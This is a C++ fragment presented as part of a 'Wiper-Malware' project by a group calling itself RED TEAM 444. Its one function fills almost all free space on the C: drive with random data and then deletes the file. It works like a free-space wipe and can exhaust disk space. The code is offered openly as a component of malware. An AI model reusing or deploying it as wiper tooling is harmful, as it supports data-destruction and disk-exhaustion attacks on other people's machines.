/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

void clearFreeDiskSpace() {
    std::string tempFile = "C:\\Temp\\wipe.tmp";  // Temporary file for filling disk space

    try {
        ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
            uint64_t freeSpace = totalFreeBytes.QuadPart;

            // Open a file and fill it with random data until disk is nearly full
            std::ofstream file(tempFile, std::ios::binary);
            if (file.is_open()) {
                char buffer[4096];  // Buffer to write random data
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dist(0, 255);
                
                // Fill the file with random bytes
                for (size_t i = 0; i < sizeof(buffer); ++i) {
                    buffer[i] = static_cast<char>(dist(gen));
                }

                uint64_t writtenBytes = 0;
                while (writtenBytes < freeSpace - (100 * 1024 * 1024)) {  // Leave some space for system
                    file.write(buffer, sizeof(buffer));
                    writtenBytes += sizeof(buffer);
                }
                file.close();
                std::filesystem::remove(tempFile);  // Remove the temporary file
                std::cout << "Free disk space wiped successfully.\n";
            } else {
                std::cerr << "Error creating temporary file for wiping free space.\n";
            }
        } else {
            std::cerr << "Error getting free disk space information.\n";
        }
    } catch (const std::exception& e) {
        std::cerr << "Error wiping free disk space: " << e.what() << "\n";
    }
}
